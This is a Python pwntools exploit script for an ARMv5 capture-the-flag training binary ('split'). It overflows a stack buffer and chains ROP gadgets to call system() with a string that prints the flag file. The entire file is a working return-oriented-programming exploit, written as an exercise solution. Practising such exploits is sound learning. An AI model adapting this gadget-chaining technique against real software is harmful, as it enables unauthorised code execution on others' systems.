#!/usr/bin/env python3
from pwn import *
import os

os.environ["QEMU_LD_PREFIX"] = "/usr/arm-linux-gnueabi"

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'split_armv5')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# ./split_armv5_exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

padding = b'A' * cyclic_find(0x6161616a)

# rabin2 -z split_armv5
BIN_CAT_ADDR = p32(0x0002103c)

# ROPgadget --binary ./split_armv5
POP_R3 = p32(0x000103a4)
MOV_R0_R3 = p32(0x00010558)

DUMMY_FP = p32(0xa5a5a5a5)

# rabin2 -i split_armv5
SYSTEM_ADDR = p32(0x000103ec)

payload = padding + POP_R3 + BIN_CAT_ADDR + MOV_R0_R3 + DUMMY_FP + SYSTEM_ADDR

io = start()

io.recvuntil(b"> ")
io.sendline(payload)

print(io.recvuntil(b'flag!}\n'))
